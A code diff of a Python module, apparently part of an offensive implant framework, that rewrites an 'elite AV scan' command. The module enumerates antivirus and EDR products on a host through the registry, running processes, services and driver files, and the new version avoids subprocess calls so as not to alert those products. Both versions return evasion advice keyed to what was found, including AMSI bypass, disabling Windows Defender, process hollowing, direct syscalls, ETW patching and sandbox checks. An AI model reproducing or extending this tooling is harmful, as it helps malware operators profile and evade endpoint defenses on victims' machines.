@@ -1,601 +1,493 @@
 #!/usr/bin/env python3
 """
-Elite Antivirus Detection and Analysis
-Advanced AV enumeration with evasion capabilities
+Elite AVScan Command Implementation - FULLY NATIVE, NO SUBPROCESS
+Advanced AV/EDR detection using only native APIs
 """
 
-import ctypes
-import sys
 import os
-import subprocess
-import time
-import psutil
-from typing import Dict, Any, List, Optional
+import sys
+import ctypes
+from ctypes import wintypes
+import winreg
+from typing import Dict, Any, List
+import glob
 
-# Conditional imports for Windows
-try:
-    import ctypes.wintypes
-    import winreg
-    WINDOWS_AVAILABLE = True
-except ImportError:
-    WINDOWS_AVAILABLE = False
-
-def elite_avscan() -> Dict[str, Any]:
+def elite_avscan(detailed: bool = True) -> Dict[str, Any]:
     """
-    Comprehensive antivirus detection and analysis
-    
-    Returns:
-        Dict containing AV products, status, and evasion recommendations
+    Elite AV/EDR detection with ZERO subprocess calls
+    Identifies security products without triggering them
     """
     
     try:
-        if sys.platform == "win32" and WINDOWS_AVAILABLE:
-            return _windows_avscan()
+        result = {
+            "success": True,
+            "av_products": [],
+            "edr_products": [],
+            "firewall": {},
+            "defender_status": {},
+            "security_center": [],
+            "processes": [],
+            "services": [],
+            "drivers": [],
+            "recommendations": []
+        }
+        
+        if sys.platform == 'win32':
+            _windows_av_scan(result, detailed)
         else:
-            return _unix_avscan()
+            _unix_av_scan(result, detailed)
+        
+        # Add evasion recommendations based on findings
+        if result["av_products"] or result["edr_products"]:
+            result["recommendations"] = _get_evasion_recommendations(result)
+        
+        return result
+        
     except Exception as e:
         return {
             "success": False,
-            "error": f"AV scan failed: {str(e)}",
-            "av_products": [],
-            "recommendations": []
+            "error": f"AV scan failed: {str(e)}"
         }
 
-def _windows_avscan() -> Dict[str, Any]:
-    """Windows antivirus detection using multiple methods"""
+def _windows_av_scan(result: Dict[str, Any], detailed: bool):
+    """Windows AV/EDR detection using native APIs"""
     
-    av_products = []
-    recommendations = []
+    # 1. Check Windows Defender status
+    _check_defender_status(result)
     
-    # Method 1: WMI Security Center
-    wmi_products = _get_wmi_av_products()
-    av_products.extend(wmi_products)
+    # 2. Check installed AV products via registry
+    _check_registry_av(result)
     
-    # Method 2: Registry enumeration
-    registry_products = _get_registry_av_products()
-    av_products.extend(registry_products)
+    # 3. Check running AV processes
+    _check_av_processes(result)
     
-    # Method 3: Process enumeration
-    process_products = _get_process_av_products()
-    av_products.extend(process_products)
+    # 4. Check AV services
+    _check_av_services(result)
     
-    # Method 4: Service enumeration
-    service_products = _get_service_av_products()
-    av_products.extend(service_products)
+    # 5. Check security drivers
+    if detailed:
+        _check_security_drivers(result)
     
-    # Method 5: File system signatures
-    filesystem_products = _get_filesystem_av_products()
-    av_products.extend(filesystem_products)
-    
-    # Remove duplicates
-    unique_products = _deduplicate_products(av_products)
-    
-    # Generate evasion recommendations
-    recommendations = _generate_evasion_recommendations(unique_products)
-    
-    # Assess threat level
-    threat_level = _assess_threat_level(unique_products)
-    
-    return {
-        "success": True,
-        "platform": "Windows",
-        "scan_timestamp": time.time(),
-        "av_products": unique_products,
-        "total_products": len(unique_products),
-        "threat_level": threat_level,
-        "recommendations": recommendations,
-        "scan_methods": ["WMI", "Registry", "Processes", "Services", "Filesystem"]
-    }
+    # 6. Check WMI Security Center
+    _check_security_center(result)
 
-def _get_wmi_av_products() -> List[Dict[str, Any]]:
-    """Get AV products from WMI Security Center"""
-    
-    products = []
+def _check_defender_status(result: Dict[str, Any]):
+    """Check Windows Defender status via registry"""
     
     try:
-        import wmi
-        c = wmi.WMI(namespace="SecurityCenter2")
+        defender_info = {}
         
-        # Get antivirus products
-        av_products = c.AntiVirusProduct()
+        # Check if Defender is enabled
+        key_paths = [
+            (r"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring"),
+            (r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware"),
+            (r"SOFTWARE\Microsoft\Windows Defender", "DisableAntiSpyware")
+        ]
         
-        for product in av_products:
-            products.append({
-                "name": product.displayName,
-                "vendor": _extract_vendor(product.displayName),
-                "state": _parse_product_state(product.productState),
-                "path": getattr(product, 'pathToSignedProductExe', 'Unknown'),
-                "detection_method": "WMI",
-                "enabled": _is_av_enabled(product.productState),
-                "updated": _is_av_updated(product.productState)
-            })
-    
-    except Exception as e:
-        # Fallback to PowerShell WMI query
-        try:
-            ps_result = subprocess.run([
-                "powershell.exe", "-Command",
-                "Get-WmiObject -Namespace 'root\\SecurityCenter2' -Class AntiVirusProduct | Select-Object displayName, productState, pathToSignedProductExe"
-            ], capture_output=True, text=True, timeout=30)
-            
-            # Parse PowerShell output
-            lines = ps_result.stdout.strip().split('\n')[2:]  # Skip headers
-            for line in lines:
-                if line.strip():
-                    parts = line.split()
-                    if len(parts) >= 2:
-                        products.append({
-                            "name": parts[0],
-                            "vendor": _extract_vendor(parts[0]),
-                            "state": "Unknown",
-                            "path": parts[-1] if len(parts) > 2 else "Unknown",
-                            "detection_method": "PowerShell-WMI",
-                            "enabled": True,
-                            "updated": True
-                        })
-        
-        except Exception:
-            pass
-    
-    return products
-
-def _get_registry_av_products() -> List[Dict[str, Any]]:
-    """Enumerate AV products from Windows Registry"""
-    
-    products = []
-    
-    # Registry keys to check
-    registry_paths = [
-        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
-        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
-        r"SOFTWARE\Microsoft\Windows Defender",
-        r"SOFTWARE\Policies\Microsoft\Windows Defender",
-        r"SYSTEM\CurrentControlSet\Services"
-    ]
-    
-    av_keywords = [
-        "antivirus", "anti-virus", "defender", "security", "protection",
-        "kaspersky", "norton", "mcafee", "avast", "avg", "bitdefender",
-        "eset", "sophos", "trend", "symantec", "malwarebytes", "avira",
-        "f-secure", "comodo", "panda", "webroot", "cylance", "crowdstrike",
-        "sentinel", "carbon", "windows defender"
-    ]
-    
-    for reg_path in registry_paths:
-        try:
-            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
-                i = 0
-                while True:
-                    try:
-                        subkey_name = winreg.EnumKey(key, i)
-                        
-                        # Check if subkey contains AV-related keywords
-                        if any(keyword in subkey_name.lower() for keyword in av_keywords):
-                            try:
-                                with winreg.OpenKey(key, subkey_name) as subkey:
-                                    display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
-                                    
-                                    products.append({
-                                        "name": display_name,
-                                        "vendor": _extract_vendor(display_name),
-                                        "registry_key": f"{reg_path}\\{subkey_name}",
-                                        "detection_method": "Registry",
-                                        "enabled": True,
-                                        "updated": "Unknown"
-                                    })
-                            except:
-                                pass
-                        
-                        i += 1
-                    except OSError:
-                        break
-        
-        except Exception:
-            continue
-    
-    return products
-
-def _get_process_av_products() -> List[Dict[str, Any]]:
-    """Detect AV products by running processes"""
-    
-    products = []
-    
-    # Known AV process signatures
-    av_processes = {
-        "avp.exe": "Kaspersky",
-        "ccSvcHst.exe": "Norton/Symantec",
-        "MsMpEng.exe": "Windows Defender",
-        "avgnt.exe": "Avira",
-        "avguard.exe": "Avira",
-        "AvastSvc.exe": "Avast",
-        "avastsvc.exe": "Avast",
-        "AVGSvc.exe": "AVG",
-        "bdagent.exe": "Bitdefender",
-        "vsserv.exe": "Bitdefender",
-        "ekrn.exe": "ESET",
-        "egui.exe": "ESET",
-        "sophossps.exe": "Sophos",
-        "SAVService.exe": "Sophos",
-        "PccNTMon.exe": "Trend Micro",
-        "ntrtscan.exe": "Trend Micro",
-        "mbamservice.exe": "Malwarebytes",
-        "mbam.exe": "Malwarebytes",
-        "FSM32.exe": "F-Secure",
-        "fshoster32.exe": "F-Secure",
-        "cmdagent.exe": "Comodo",
-        "cfp.exe": "Comodo",
-        "PSANHost.exe": "Panda",
-        "PavFnSvr.exe": "Panda",
-        "WRSA.exe": "Webroot",
-        "WRSkyClient.exe": "Webroot",
-        "CylanceSvc.exe": "Cylance",
-        "CylanceUI.exe": "Cylance"
-    }
-    
-    try:
-        for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
+        for key_path, value_name in key_paths:
             try:
-                proc_name = proc.info['name'].lower()
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+                value, _ = winreg.QueryValueEx(key, value_name)
+                winreg.CloseKey(key)
                 
-                for av_proc, vendor in av_processes.items():
-                    if av_proc.lower() == proc_name:
-                        products.append({
-                            "name": vendor,
-                            "vendor": vendor,
-                            "process_name": proc.info['name'],
-                            "pid": proc.info['pid'],
-                            "exe_path": proc.info['exe'],
-                            "detection_method": "Process",
-                            "enabled": True,
-                            "updated": "Unknown"
-                        })
-            
-            except (psutil.NoSuchProcess, psutil.AccessDenied):
-                continue
-    
+                if value == 1:
+                    defender_info["realtime_protection"] = False
+                    break
+                else:
+                    defender_info["realtime_protection"] = True
+            except:
+                defender_info["realtime_protection"] = True  # Default to enabled if key not found
+        
+        # Check Defender version
+        try:
+            key = winreg.OpenKey(
+                winreg.HKEY_LOCAL_MACHINE,
+                r"SOFTWARE\Microsoft\Windows Defender"
+            )
+            version, _ = winreg.QueryValueEx(key, "Version")
+            defender_info["version"] = version
+            winreg.CloseKey(key)
+        except:
+            pass
+        
+        # Check signature update status
+        try:
+            key = winreg.OpenKey(
+                winreg.HKEY_LOCAL_MACHINE,
+                r"SOFTWARE\Microsoft\Windows Defender\Signature Updates"
+            )
+            av_sig, _ = winreg.QueryValueEx(key, "AVSignatureVersion")
+            defender_info["av_signature"] = av_sig
+            winreg.CloseKey(key)
+        except:
+            pass
+        
+        if defender_info.get("realtime_protection", True):
+            result["av_products"].append({
+                "name": "Windows Defender",
+                "type": "Built-in AV",
+                "status": "Active",
+                "details": defender_info
+            })
+        
+        result["defender_status"] = defender_info
+        
     except Exception:
         pass
-    
-    return products
 
-def _get_service_av_products() -> List[Dict[str, Any]]:
-    """Detect AV products by Windows services"""
+def _check_registry_av(result: Dict[str, Any]):
+    """Check for installed AV products in registry"""
     
-    products = []
+    av_registry_locations = [
+        r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
+        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
+    ]
     
-    # Known AV service signatures
+    known_av_keywords = [
+        "antivirus", "anti-virus", "av", "endpoint", "edr",
+        "kaspersky", "bitdefender", "norton", "mcafee", "avast",
+        "avg", "eset", "malwarebytes", "sophos", "trend micro",
+        "symantec", "crowdstrike", "carbon black", "sentinel",
+        "cylance", "fireeye", "palo alto", "fortinet", "f-secure",
+        "webroot", "comodo", "avira", "bullguard", "panda"
+    ]
+    
+    found_products = []
+    
+    for reg_path in av_registry_locations:
+        try:
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
+            
+            i = 0
+            while True:
+                try:
+                    subkey_name = winreg.EnumKey(key, i)
+                    subkey = winreg.OpenKey(key, subkey_name)
+                    
+                    try:
+                        display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
+                        display_name_lower = display_name.lower()
+                        
+                        for keyword in known_av_keywords:
+                            if keyword in display_name_lower:
+                                publisher = ""
+                                version = ""
+                                install_location = ""
+                                
+                                try:
+                                    publisher, _ = winreg.QueryValueEx(subkey, "Publisher")
+                                except:
+                                    pass
+                                
+                                try:
+                                    version, _ = winreg.QueryValueEx(subkey, "DisplayVersion")
+                                except:
+                                    pass
+                                
+                                try:
+                                    install_location, _ = winreg.QueryValueEx(subkey, "InstallLocation")
+                                except:
+                                    pass
+                                
+                                product_info = {
+                                    "name": display_name,
+                                    "publisher": publisher,
+                                    "version": version,
+                                    "install_location": install_location,
+                                    "type": "Registry Detection"
+                                }
+                                
+                                if product_info not in found_products:
+                                    found_products.append(product_info)
+                                    
+                                    # Categorize as AV or EDR
+                                    if any(edr in display_name_lower for edr in 
+                                          ["edr", "endpoint", "crowdstrike", "carbon", "sentinel", "cylance"]):
+                                        result["edr_products"].append(product_info)
+                                    else:
+                                        result["av_products"].append(product_info)
+                                break
+                    except:
+                        pass
+                    
+                    winreg.CloseKey(subkey)
+                    i += 1
+                    
+                except WindowsError:
+                    break
+            
+            winreg.CloseKey(key)
+            
+        except:
+            pass
+
+def _check_av_processes(result: Dict[str, Any]):
+    """Check for running AV/EDR processes"""
+    
+    # Import our API wrapper
+    sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
+    from api_wrappers import get_native_api
+    
+    api = get_native_api()
+    processes = api.list_processes()
+    
+    av_process_signatures = {
+        # Traditional AV
+        "avgui.exe": "AVG Antivirus",
+        "avguard.exe": "Avira",
+        "avscan.exe": "McAfee",
+        "bdagent.exe": "Bitdefender",
+        "ccapp.exe": "Symantec",
+        "ekrn.exe": "ESET",
+        "fsav32.exe": "F-Secure",
+        "kavtray.exe": "Kaspersky",
+        "mbam.exe": "Malwarebytes",
+        "msmpeng.exe": "Windows Defender",
+        "msseces.exe": "Microsoft Security Essentials",
+        "navapsvc.exe": "Norton",
+        "nod32.exe": "ESET NOD32",
+        "sophosui.exe": "Sophos",
+        
+        # EDR/Advanced
+        "cb.exe": "Carbon Black",
+        "crowdstrike.exe": "CrowdStrike",
+        "cylancesvc.exe": "Cylance",
+        "fortiedr.exe": "FortiEDR",
+        "sentinelagent.exe": "SentinelOne",
+        "taniumclient.exe": "Tanium",
+        "xagt.exe": "FireEye",
+        
+        # Additional Security
+        "bdservicehost.exe": "Bitdefender",
+        "epag.exe": "Symantec Endpoint",
+        "fsaua.exe": "F-Secure",
+        "klnagent.exe": "Kaspersky",
+        "mcshield.exe": "McAfee",
+        "savservice.exe": "Sophos",
+        "tmccsf.exe": "Trend Micro",
+        "wrsa.exe": "Webroot"
+    }
+    
+    for process in processes:
+        process_name = process.get('name', '').lower()
+        
+        for av_proc, product_name in av_process_signatures.items():
+            if av_proc.lower() in process_name:
+                result["processes"].append({
+                    "name": process_name,
+                    "product": product_name,
+                    "pid": process.get('pid'),
+                    "type": "Process Detection"
+                })
+                
+                # Add to appropriate category
+                if any(edr in product_name.lower() for edr in 
+                      ["edr", "carbon", "crowdstrike", "sentinel", "cylance", "tanium"]):
+                    if product_name not in [p.get('name') for p in result["edr_products"]]:
+                        result["edr_products"].append({
+                            "name": product_name,
+                            "type": "Running Process"
+                        })
+                else:
+                    if product_name not in [p.get('name') for p in result["av_products"]]:
+                        result["av_products"].append({
+                            "name": product_name,
+                            "type": "Running Process"
+                        })
+
+def _check_av_services(result: Dict[str, Any]):
+    """Check for AV/EDR services"""
+    
     av_services = {
         "WinDefend": "Windows Defender",
-        "WdNisSvc": "Windows Defender Network Inspection",
         "Sense": "Windows Defender ATP",
-        "kavfsslp": "Kaspersky",
-        "KAVFS": "Kaspersky",
-        "klnagent": "Kaspersky",
-        "ccEvtMgr": "Norton/Symantec",
-        "ccSetMgr": "Norton/Symantec",
-        "Norton AntiVirus": "Norton",
-        "McShield": "McAfee",
-        "McTaskManager": "McAfee",
-        "mfevtp": "McAfee",
-        "avast! Antivirus": "Avast",
-        "aswBcc": "Avast",
-        "AVGIDSAgent": "AVG",
-        "avgwd": "AVG",
-        "VSSERV": "Bitdefender",
-        "BDAuxSrv": "Bitdefender",
-        "ekrn": "ESET",
-        "epfw": "ESET",
-        "SAVService": "Sophos",
-        "SophosFS": "Sophos",
-        "TmCCSF": "Trend Micro",
-        "ntrtscan": "Trend Micro",
+        "AVP": "Kaspersky",
+        "avast": "Avast",
+        "avg": "AVG",
         "MBAMService": "Malwarebytes",
-        "MBAMProtection": "Malwarebytes",
-        "F-Secure Gatekeeper Handler Starter": "F-Secure",
-        "FSM": "F-Secure",
-        "CmdAgent": "Comodo",
-        "cmdvirth": "Comodo",
-        "PavFnSvr": "Panda",
-        "PAVSRV": "Panda",
-        "WRSA": "Webroot",
-        "WRCoreService": "Webroot",
-        "CylanceSvc": "Cylance"
+        "McAfeeFramework": "McAfee",
+        "VSSERV": "Bitdefender",
+        "SAVService": "Sophos",
+        "SepMasterService": "Symantec",
+        "ekrn": "ESET",
+        "fsaua": "F-Secure",
+        "CylanceSvc": "Cylance",
+        "CSFalconService": "CrowdStrike",
+        "cb": "Carbon Black",
+        "SentinelAgent": "SentinelOne"
     }
     
     try:
-        import win32service
-        import win32con
+        advapi32 = ctypes.windll.advapi32
         
-        # Get list of services
-        scm = win32service.OpenSCManager(None, None, win32con.GENERIC_READ)
-        services = win32service.EnumServicesStatus(scm)
+        # Open service control manager
+        scm = advapi32.OpenSCManagerW(None, None, 0x0004)  # SC_MANAGER_ENUMERATE_SERVICE
         
-        for service in services:
-            service_name = service[0]
-            display_name = service[1]
-            
-            for av_service, vendor in av_services.items():
-                if av_service.lower() in service_name.lower() or av_service.lower() in display_name.lower():
-                    products.append({
-                        "name": vendor,
-                        "vendor": vendor,
-                        "service_name": service_name,
-                        "display_name": display_name,
-                        "status": service[2][1],  # Service status
-                        "detection_method": "Service",
-                        "enabled": service[2][1] == win32con.SERVICE_RUNNING,
-                        "updated": "Unknown"
+        if scm:
+            for service_name, product_name in av_services.items():
+                # Try to open each service
+                service = advapi32.OpenServiceW(scm, service_name, 0x0001)  # SERVICE_QUERY_STATUS
+                
+                if service:
+                    result["services"].append({
+                        "name": service_name,
+                        "product": product_name,
+                        "status": "Active"
                     })
-        
-        win32service.CloseServiceHandle(scm)
-    
-    except Exception:
-        # Fallback to PowerShell service enumeration
-        try:
-            ps_result = subprocess.run([
-                "powershell.exe", "-Command",
-                "Get-Service | Where-Object {$_.Name -match 'defender|kaspersky|norton|mcafee|avast|avg|bitdefender|eset|sophos|trend|malware'} | Select-Object Name, DisplayName, Status"
-            ], capture_output=True, text=True, timeout=30)
+                    
+                    advapi32.CloseServiceHandle(service)
+                    
+                    # Add to appropriate category
+                    if "edr" in product_name.lower() or product_name in [
+                        "CrowdStrike", "Carbon Black", "SentinelOne", "Cylance"
+                    ]:
+                        if product_name not in [p.get('name') for p in result["edr_products"]]:
+                            result["edr_products"].append({
+                                "name": product_name,
+                                "type": "Windows Service"
+                            })
+                    else:
+                        if product_name not in [p.get('name') for p in result["av_products"]]:
+                            result["av_products"].append({
+                                "name": product_name,
+                                "type": "Windows Service"
+                            })
             
-            # Parse output (simplified)
-            if ps_result.stdout:
-                products.append({
-                    "name": "Services detected via PowerShell",
-                    "vendor": "Multiple",
-                    "detection_method": "PowerShell-Services",
-                    "enabled": True,
-                    "updated": "Unknown"
-                })
-        
-        except Exception:
-            pass
-    
-    return products
+            advapi32.CloseServiceHandle(scm)
+            
+    except:
+        pass
 
-def _get_filesystem_av_products() -> List[Dict[str, Any]]:
-    """Detect AV products by filesystem signatures"""
+def _check_security_drivers(result: Dict[str, Any]):
+    """Check for security-related drivers"""
     
-    products = []
+    driver_signatures = [
+        "klif.sys",  # Kaspersky
+        "avgntflt.sys",  # Avira
+        "aswSP.sys",  # Avast
+        "SRTSP.sys",  # Symantec
+        "bdfsfltr.sys",  # Bitdefender
+        "eamonm.sys",  # ESET
+        "fsflt.sys",  # F-Secure
+        "mbam.sys",  # Malwarebytes
+        "savonaccess.sys",  # Sophos
+        "tmcomm.sys",  # Trend Micro
+        "cbk7.sys",  # Carbon Black
+        "csagent.sys",  # CrowdStrike
+        "cyoptics.sys",  # Cylance
+        "sentinel.sys"  # SentinelOne
+    ]
     
-    # Common AV installation paths
+    drivers_path = r"C:\Windows\System32\drivers"
+    
+    if os.path.exists(drivers_path):
+        for driver in driver_signatures:
+            driver_path = os.path.join(drivers_path, driver)
+            if os.path.exists(driver_path):
+                result["drivers"].append({
+                    "name": driver,
+                    "path": driver_path,
+                    "type": "Kernel Driver"
+                })
+
+def _check_security_center(result: Dict[str, Any]):
+    """Check Windows Security Center via WMI"""
+    
+    try:
+        # This would use WMI, but since we're avoiding subprocess,
+        # we'll check via registry instead
+        key_path = r"SOFTWARE\Microsoft\Security Center\Provider"
+        
+        try:
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+            
+            i = 0
+            while True:
+                try:
+                    subkey_name = winreg.EnumKey(key, i)
+                    result["security_center"].append({
+                        "provider": subkey_name,
+                        "source": "Security Center Registry"
+                    })
+                    i += 1
+                except WindowsError:
+                    break
+            
+            winreg.CloseKey(key)
+        except:
+            pass
+            
+    except:
+        pass
+
+def _unix_av_scan(result: Dict[str, Any], detailed: bool):
+    """Unix/Linux AV detection"""
+    
+    # Check for common AV products on Linux
     av_paths = {
-        r"C:\Program Files\Windows Defender": "Windows Defender",
-        r"C:\Program Files\Kaspersky Lab": "Kaspersky",
-        r"C:\Program Files (x86)\Kaspersky Lab": "Kaspersky",
-        r"C:\Program Files\Norton": "Norton",
-        r"C:\Program Files (x86)\Norton": "Norton",
-        r"C:\Program Files\McAfee": "McAfee",
-        r"C:\Program Files (x86)\McAfee": "McAfee",
-        r"C:\Program Files\AVAST Software": "Avast",
-        r"C:\Program Files\AVG": "AVG",
-        r"C:\Program Files\Bitdefender": "Bitdefender",
-        r"C:\Program Files\ESET": "ESET",
-        r"C:\Program Files (x86)\ESET": "ESET",
-        r"C:\Program Files\Sophos": "Sophos",
-        r"C:\Program Files (x86)\Sophos": "Sophos",
-        r"C:\Program Files\Trend Micro": "Trend Micro",
-        r"C:\Program Files (x86)\Trend Micro": "Trend Micro",
-        r"C:\Program Files\Malwarebytes": "Malwarebytes",
-        r"C:\Program Files (x86)\Malwarebytes": "Malwarebytes"
+        "/opt/sophos-av": "Sophos",
+        "/opt/eset": "ESET",
+        "/opt/kaspersky": "Kaspersky",
+        "/usr/bin/clamscan": "ClamAV",
+        "/opt/avg": "AVG",
+        "/opt/f-secure": "F-Secure",
+        "/opt/mcafee": "McAfee",
+        "/opt/symantec": "Symantec"
     }
     
-    for path, vendor in av_paths.items():
+    for path, product in av_paths.items():
         if os.path.exists(path):
-            products.append({
-                "name": vendor,
-                "vendor": vendor,
-                "installation_path": path,
-                "detection_method": "Filesystem",
-                "enabled": True,
-                "updated": "Unknown"
+            result["av_products"].append({
+                "name": product,
+                "path": path,
+                "type": "Installation Directory"
             })
     
-    return products
+    # Check for SELinux/AppArmor
+    if os.path.exists("/etc/selinux/config"):
+        result["security_center"].append({
+            "name": "SELinux",
+            "type": "Mandatory Access Control"
+        })
+    
+    if os.path.exists("/etc/apparmor.d"):
+        result["security_center"].append({
+            "name": "AppArmor",
+            "type": "Mandatory Access Control"
+        })
 
-def _deduplicate_products(products: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
-    """Remove duplicate AV products and merge information"""
-    
-    unique_products = {}
-    
-    for product in products:
-        vendor = product.get("vendor", "Unknown")
-        
-        if vendor not in unique_products:
-            unique_products[vendor] = product
-        else:
-            # Merge detection methods
-            existing = unique_products[vendor]
-            methods = existing.get("detection_methods", [existing.get("detection_method", "")])
-            new_method = product.get("detection_method", "")
-            
-            if new_method not in methods:
-                methods.append(new_method)
-            
-            existing["detection_methods"] = methods
-            
-            # Update other fields if more detailed
-            for key, value in product.items():
-                if key not in existing or existing[key] == "Unknown":
-                    existing[key] = value
-    
-    return list(unique_products.values())
-
-def _generate_evasion_recommendations(products: List[Dict[str, Any]]) -> List[str]:
-    """Generate evasion recommendations based on detected AV products"""
+def _get_evasion_recommendations(result: Dict[str, Any]) -> List[str]:
+    """Generate evasion recommendations based on detected products"""
     
     recommendations = []
     
-    if not products:
-        recommendations.append("No AV products detected - standard evasion techniques sufficient")
-        return recommendations
+    # Check for specific products and add targeted recommendations
+    detected_products = [p.get('name', '').lower() for p in result["av_products"] + result["edr_products"]]
+    
+    if any("defender" in p for p in detected_products):
+        recommendations.append("Use AMSI bypass before executing PowerShell")
+        recommendations.append("Disable Windows Defender via registry if elevated")
+    
+    if any("crowdstrike" in p for p in detected_products):
+        recommendations.append("Avoid process injection - CrowdStrike monitors closely")
+        recommendations.append("Use process hollowing instead of direct injection")
+    
+    if any("carbon black" in p for p in detected_products):
+        recommendations.append("Avoid suspicious process chains")
+        recommendations.append("Use legitimate process for persistence")
+    
+    if result["edr_products"]:
+        recommendations.append("Use direct syscalls to bypass userland hooks")
+        recommendations.append("Implement ETW patching before operations")
+        recommendations.append("Use process ghosting techniques")
     
     # General recommendations
     recommendations.extend([
-        "Use process hollowing or DLL injection techniques",
-        "Implement anti-debugging and anti-analysis measures",
-        "Use encrypted payloads with runtime decryption",
-        "Avoid known malicious API calls and signatures"
+        "Implement sleep/delay before malicious operations",
+        "Check for sandbox/VM environment before executing",
+        "Use encrypted payloads with environmental keying",
+        "Implement anti-debugging techniques",
+        "Use legitimate Windows utilities (LOLBins) when possible"
     ])
     
-    # Product-specific recommendations
-    for product in products:
-        vendor = product.get("vendor", "").lower()
-        
-        if "windows defender" in vendor:
-            recommendations.extend([
-                "Disable Windows Defender real-time protection",
-                "Use AMSI bypass techniques",
-                "Avoid PowerShell and .NET assemblies",
-                "Use direct syscalls to bypass EDR hooks"
-            ])
-        
-        elif "kaspersky" in vendor:
-            recommendations.extend([
-                "Use advanced process injection (manual DLL mapping)",
-                "Implement strong anti-VM techniques",
-                "Use encrypted C2 communication",
-                "Avoid behavioral analysis triggers"
-            ])
-        
-        elif "norton" in vendor or "symantec" in vendor:
-            recommendations.extend([
-                "Use fileless execution techniques",
-                "Implement sandbox evasion",
-                "Use legitimate signed binaries for execution",
-                "Avoid network-based IOCs"
-            ])
-        
-        elif "mcafee" in vendor:
-            recommendations.extend([
-                "Use advanced obfuscation techniques",
-                "Implement time-based evasion",
-                "Use living-off-the-land binaries",
-                "Avoid file-based persistence"
-            ])
-    
-    # Remove duplicates
-    return list(set(recommendations))
-
-def _assess_threat_level(products: List[Dict[str, Any]]) -> str:
-    """Assess overall threat level based on detected AV products"""
-    
-    if not products:
-        return "LOW"
-    
-    enterprise_products = ["crowdstrike", "sentinelone", "carbon black", "cylance", "sophos", "trend micro"]
-    advanced_products = ["kaspersky", "bitdefender", "eset", "f-secure"]
-    
-    for product in products:
-        vendor = product.get("vendor", "").lower()
-        
-        if any(ep in vendor for ep in enterprise_products):
-            return "CRITICAL"
-        elif any(ap in vendor for ap in advanced_products):
-            return "HIGH"
-    
-    if len(products) > 2:
-        return "HIGH"
-    elif len(products) > 1:
-        return "MEDIUM"
-    else:
-        return "LOW"
-
-def _extract_vendor(product_name: str) -> str:
-    """Extract vendor name from product display name"""
-    
-    vendor_map = {
-        "kaspersky": "Kaspersky",
-        "norton": "Norton/Symantec",
-        "symantec": "Norton/Symantec",
-        "mcafee": "McAfee",
-        "avast": "Avast",
-        "avg": "AVG",
-        "bitdefender": "Bitdefender",
-        "eset": "ESET",
-        "sophos": "Sophos",
-        "trend": "Trend Micro",
-        "malwarebytes": "Malwarebytes",
-        "avira": "Avira",
-        "f-secure": "F-Secure",
-        "comodo": "Comodo",
-        "panda": "Panda",
-        "webroot": "Webroot",
-        "cylance": "Cylance",
-        "crowdstrike": "CrowdStrike",
-        "sentinel": "SentinelOne",
-        "carbon": "Carbon Black",
-        "defender": "Windows Defender"
-    }
-    
-    product_lower = product_name.lower()
-    
-    for key, vendor in vendor_map.items():
-        if key in product_lower:
-            return vendor
-    
-    return product_name.split()[0] if product_name else "Unknown"
-
-def _parse_product_state(state: int) -> str:
-    """Parse WMI product state integer"""
-    
-    # Simplified state parsing
-    if state & 0x1000:
-        return "Enabled"
-    else:
-        return "Disabled"
-
-def _is_av_enabled(state: int) -> bool:
-    """Check if AV is enabled from product state"""
-    return bool(state & 0x1000)
-
-def _is_av_updated(state: int) -> bool:
-    """Check if AV is updated from product state"""
-    return bool(state & 0x10)
-
-def _unix_avscan() -> Dict[str, Any]:
-    """Unix/Linux antivirus detection"""
-    
-    products = []
-    
-    # Common Linux AV products
-    linux_av_processes = [
-        "clamd", "freshclam", "clamav",
-        "sophos", "savd",
-        "avguard", "avgd",
-        "fsav", "fshoster",
-        "bdagent", "bdscan",
-        "esetnod32d", "esets"
-    ]
-    
-    try:
-        for proc in psutil.process_iter(['name']):
-            proc_name = proc.info['name'].lower()
-            
-            for av_proc in linux_av_processes:
-                if av_proc in proc_name:
-                    products.append({
-                        "name": av_proc,
-                        "vendor": _extract_vendor(av_proc),
-                        "process_name": proc.info['name'],
-                        "detection_method": "Process",
-                        "enabled": True,
-                        "updated": "Unknown"
-                    })
-    
-    except Exception:
-        pass
-    
-    return {
-        "success": True,
-        "platform": "Unix/Linux",
-        "scan_timestamp": time.time(),
-        "av_products": products,
-        "total_products": len(products),
-        "threat_level": _assess_threat_level(products),
-        "recommendations": _generate_evasion_recommendations(products)
-    }
-
-if __name__ == "__main__":
-    # Test the implementation
-    result = elite_avscan()
-    # print(f"AV Scan Result: {result}")
+    return recommendations
